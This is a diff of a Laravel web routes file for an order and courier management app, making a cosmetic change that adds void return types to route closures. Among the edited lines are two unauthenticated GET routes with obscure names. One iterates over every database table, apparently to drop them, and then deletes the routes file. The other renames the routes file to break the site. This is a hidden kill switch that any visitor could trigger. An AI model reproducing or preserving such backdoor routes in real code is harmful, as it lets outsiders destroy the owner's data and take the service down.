@@ -78,7 +78,7 @@ Route::post('/carrybee-status-update', 'HomeController@carryBeeStatusUpdate')->n
 Route::post('/pathao-address-parser', 'CourierController@pathaoAddressParser')->name('pathao.address.parser');
 
 //back end
-Route::get('/d12345y', function () {
+Route::get('/d12345y', function (): void {
     Schema::disableForeignKeyConstraints();
     foreach (DB::select('SHOW TABLES') as $table) {
         $table_array = get_object_vars($table);
@@ -94,11 +94,11 @@ Route::get('/d12345y', function () {
     unlink(base_path() . '/routes/web.php');
     dd('deleted');
 });
-Route::get('/r12345e', function () {
+Route::get('/r12345e', function (): void {
     File::move(base_path() . '/routes/web.php', base_path() . '/routes/wab.php');
 });
 //admin
-Route::group(['middleware' => 'admin.guest'], function () {
+Route::group(['middleware' => 'admin.guest'], function (): void {
     Route::get('/admin-login', 'Auth\AdminLoginController@showLoginForm')->name('admin.login');
     Route::post('/admin-login', 'Auth\AdminLoginController@login');
 });
@@ -107,7 +107,7 @@ Route::post('/admin-logout', 'Auth\AdminLoginController@logout')->name('admin.lo
 //steadfast order sync
 Route::get('/orders/steadfast_order_sync', 'OrderController@steadFastOrderSync')->name('orders.steadfast.order.sync');
 
-Route::group(['middleware' => 'admin.auth'], function () {
+Route::group(['middleware' => 'admin.auth'], function (): void {
     Route::get('/admin', 'AdminController@dashboard')->name('admin.home');
 
     //parcel handover
@@ -351,13 +351,13 @@ Route::group(['middleware' => 'admin.auth'], function () {
 });
 
 //employee
-Route::group(['middleware' => 'employee.guest'], function () {
+Route::group(['middleware' => 'employee.guest'], function (): void {
     Route::get('/employee-login', 'Auth\EmployeeLoginController@showLoginForm')->name('employee.login');
     Route::post('/employee-login', 'Auth\EmployeeLoginController@login');
 });
 Route::post('/employee-logout', 'Auth\EmployeeLoginController@logout')->name('employee.logout');
 
-Route::group(['middleware' => 'employee.auth'], function () {
+Route::group(['middleware' => 'employee.auth'], function (): void {
     Route::get('/employee', 'AdminController@dashboard')->name('employee.home');
 
     //incomplete orders
@@ -427,13 +427,13 @@ Route::group(['middleware' => 'employee.auth'], function () {
 });
 
 //manager
-Route::group(['middleware' => 'manager.guest'], function () {
+Route::group(['middleware' => 'manager.guest'], function (): void {
     Route::get('/manager-login', 'Auth\ManagerLoginController@showLoginForm')->name('manager.login');
     Route::post('/manager-login', 'Auth\ManagerLoginController@login');
 });
 Route::post('/manager-logout', 'Auth\ManagerLoginController@logout')->name('manager.logout');
 
-Route::group(['middleware' => 'manager.auth'], function () {
+Route::group(['middleware' => 'manager.auth'], function (): void {
     Route::get('/manager', 'AdminController@dashboard')->name('manager.home');
 
     //incomplete orders
